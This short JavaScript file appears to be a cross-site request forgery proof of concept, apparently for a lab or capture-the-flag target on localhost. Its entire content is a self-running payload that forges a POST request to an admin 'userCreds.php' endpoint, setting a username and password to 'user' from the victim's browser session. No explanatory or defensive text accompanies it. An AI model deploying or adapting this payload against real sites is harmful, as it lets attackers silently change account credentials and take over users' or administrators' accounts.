var data = "username=user&password=user";

function csrf() {

    var uri = "http://localhost:8000/admin/userCreds.php";
    xhr = new XMLHttpRequest();
    xhr.open("POST", uri, true)

    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

    xhr.onreadystatechange = function() { // Call a function when the state changes.
        if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
        }
    }
    xhr.send(data);
}

csrf();